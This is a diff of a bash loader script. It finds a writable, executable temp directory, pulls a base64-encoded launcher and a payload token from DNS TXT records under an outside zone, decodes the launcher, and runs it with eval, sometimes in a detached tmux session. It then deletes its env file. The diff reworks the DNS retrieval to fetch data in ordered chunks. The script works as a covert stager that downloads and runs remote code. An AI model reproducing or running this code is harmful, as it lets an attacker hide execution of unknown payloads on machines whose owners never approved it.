@@ -7,33 +7,45 @@ for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
     rm -f $ph/.xtst
     touch $ph/.xtst &&
         chmod +x $ph/.xtst &&
-        [ -z '$(cat /proc/mounts | grep -E " '$ph' .*,?noexec")' ] &&
+        $ph/.xtst &&
         rm -f $ph/.xtst &&
         cd $ph &&
-    break
+        break
 done
 { type base64 &>/dev/null && b64=base64; } ||
         { type openssl &>/dev/null && b64="openssl enc -base64 "; } ||
                 { sleep 3 && echo "no encoding tools availables!" exit 1; }
 
-parselauncher() {
+parsedata() {
     ## strip truncated messages
-    launcher=$(echo "${launcher}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
+    # data=$(echo "${data}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
+    data=$(IFS=\$'" "'; echo $data) ## after this we order chunks
+    data=${data// }
+    data=$(while read l; do echo ${l:1}; done <<< "$data")
     ## dns records escaping related
-    launcher=${launcher//\ }
-    launcher=${launcher//\"}
+    # data=${data//\ }
+    # data=${data//\"}
     ## fix for freedns TXT submission
-    [ "$launcher" != "${launcher%eql}" ] && launcher="${launcher%eql}="
-    launcher=$(echo "$launcher" | $b64 -d)
+    # [ "$data" != "${data%eql}" ] && data="${data%eql}="
+}
+
+querydns() {
+    dig="dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
+    $dig @1.1.1.1 || $dig @8.8.8.8 || $dig
 }
 
 endpoints() {
-    script_ep=plo.sly.io
-    pl_token_ep=pl.drun.ml
+    chunksize=2047 # 1 char for order
+    zone=drun.ml
+    record=d
+    data=$(querydns)
+    parsedata
+    launcher=${data}
+    launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
     # script_url=$(dig txt latest.drun.ml +short)
-    launcher=$(dig txt $script_ep  +short @8.8.8.8)
-    parselauncher
-    pl_token=$(dig txt $pl_token_ep +short @8.8.8.8)
+    zone=drun.ml
+    record=pl
+    pl_token=$(querydns)
     pl_token=${pl_token//\"}
 }
 
@@ -63,9 +75,9 @@ else
             endpoints_fallback
 fi
 
-echo "export \
-
-">env.sh
+export pl_token=${pl_token} pl_name="payload-latest.zip"
+# echo "export \
+#     ">>env.sh
 
 if [ "$TMX" = 1 ]; then
     tmx_init="new -s init sleep 10"
@@ -73,9 +85,12 @@ if [ "$TMX" = 1 ]; then
     tmux start-server
     tmux set -g default-shell /bin/bash
 
+    tmux  setenv -g pl_token "$pl_token"
+    tmux  setenv -g pl_name "$pl_name"
+
     tmux new -d -s crt 'eval '"$launcher"
-    (sleep 3 && rm env.sh) &>/dev/null &
+    (sleep 5 && rm env.sh) &>/dev/null &
 else
+    (sleep 5 && rm env.sh) &>/dev/null &
     eval "$launcher"
-    # wait %1
 fi
